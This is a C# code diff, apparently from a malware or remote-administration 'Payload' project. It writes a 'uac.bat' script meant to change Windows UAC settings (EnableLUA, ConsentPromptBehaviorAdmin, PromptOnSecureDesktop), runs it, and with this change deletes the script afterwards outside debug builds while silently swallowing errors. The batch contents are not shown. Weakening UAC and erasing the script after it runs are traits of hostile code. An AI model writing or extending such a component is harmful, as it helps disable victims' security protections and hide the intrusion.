@@ -38,16 +38,35 @@ namespace Payload.Core.Command
         private static readonly string _ConsentPromptBehaviorAdmin_Tag = $@"{_TagPrefix}{UacConifg.ConsentPromptBehaviorAdmin_Name}{_Tagsupfix}";
         private static readonly string _EnableLUA_Tag = $@"{_TagPrefix}{UacConifg.EnableLUA_Name}{_Tagsupfix}";
         private static readonly string _PromptOnSecureDesktop_Tag = $@"{_TagPrefix}{UacConifg.PromptOnSecureDesktop_Name}{_Tagsupfix}";
+        private string _TargetBatFullPath = string.Empty;
 
         public override Task Execute()
         {
             try
             {
                 BatCall();
+
             }
             catch { }
+            finally
+            {
+                DeleteBatFile();
+            }
             
             return null;
+        }
+
+        public void DeleteBatFile()
+        {
+            try
+            {
+#if DEBUG
+                return;
+#else
+                File.Delete(_TargetBatFullPath);
+#endif
+            }
+            catch { }
         }
 
         public string PrepareBatText()
@@ -66,14 +85,14 @@ namespace Payload.Core.Command
 
         void BatCall()
         {
-            string batPath = Config.Instance.WorkSpaceDir + "\\uac.bat";
+            _TargetBatFullPath = Config.Instance.WorkSpaceDir + "\\uac.bat";
 
-            using (StreamWriter writer = new StreamWriter(batPath))
+            using (StreamWriter writer = new StreamWriter(_TargetBatFullPath))
             {
                 writer.Write(PrepareBatText());
             }
             var p = new Process();
-            p.StartInfo.FileName = batPath;
+            p.StartInfo.FileName = _TargetBatFullPath;
             p.Start();
         }
     }
